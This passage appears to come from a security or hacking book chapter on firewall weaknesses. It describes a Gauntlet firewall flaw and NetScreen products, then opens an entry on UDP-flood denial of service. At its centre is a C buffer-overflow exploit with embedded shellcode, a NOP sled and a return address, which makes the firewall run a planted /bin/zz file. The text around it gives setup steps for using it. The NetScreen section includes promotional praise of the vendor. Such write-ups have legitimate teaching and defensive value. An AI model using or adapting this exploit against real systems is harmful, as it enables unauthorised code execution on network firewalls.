is installed on Gauntlet installations, and runs for 30 days. After that period, it is disabled. During this 30-day period, the firewall is susceptible to attack. Because the filtering software is externally accessible, users not on the internal network may also be able to exploit the vulnerability. The code was written to run a test file called /bin/zz, so you need to create one in /bin on the firewall and chmod it to 700. Inside the zz file, you should have it do something that leaves you a log. Here is a simple example:

```
#include <stdio.h>

char data[364];
main() {
int i;
char shelloutput[80];
unsigned char shell[] =
"\\x90"
"\\xeb\\x1f\\x5e\\x31\\xc0\\x89\\x46\\xf5\\x88\\x46\\xfa\\x89\\x46\\x0c\\x89\\x76"
"\\x08\\x50\\x8d\\x5e\\x08\\x53\\x56\\x56\\xb0\\x3b\\x9a\\xff\\xff\\xff\\xff\\x07"
"\\xff\\xe8\\xdc\\xff\\xff/bin/zz\\x00";
for(i=0;i<264;i++)
data[i]=0x90;
data[i]=0x30;i++;
data[i]=0x9b;i++;
data[i]=0xb4;i++;
data[i]=0xef;i++;
data[i] = 0x00;
for (i=0; i<strlen(shell); i++)
shelloutput[i] = shell[i];
shelloutput[i] = 0x00;
printf ("10003,http://%s%s", data, shelloutput);
}

```

# NetScreen

NetScreen (www.netscreen.com) by NetScreen Technologies wins this author's award for best functionality and management in a single next-generation security solution. The NetScreen products combine firewall, VPN, and traffic management functionality on a single dedicated-hardware platform, up to gigabit velocity. This company is at the forefront of developing products that deliver integrated security at record-breaking performance, while still implementing the highest level of IP Security (IPsec)-compliant security. The Web administration and command-line interfaces have proven superior to most competition (see Figure 11.2).

Simple user-friendly administration and configuration procedures make setup possible out of the box in 10 minutes for standard, high-performance corporate firewalling.

# Liabilities

Denial-of-Service Flooding

**Synopsis:** This breach allows a remote attacker to potentially lock up the firewall by flooding it with UDP packets.

**Hack State:** Severe congestion.

**Vulnerabilities:** NetScreen 5/10/100, depending on configuration.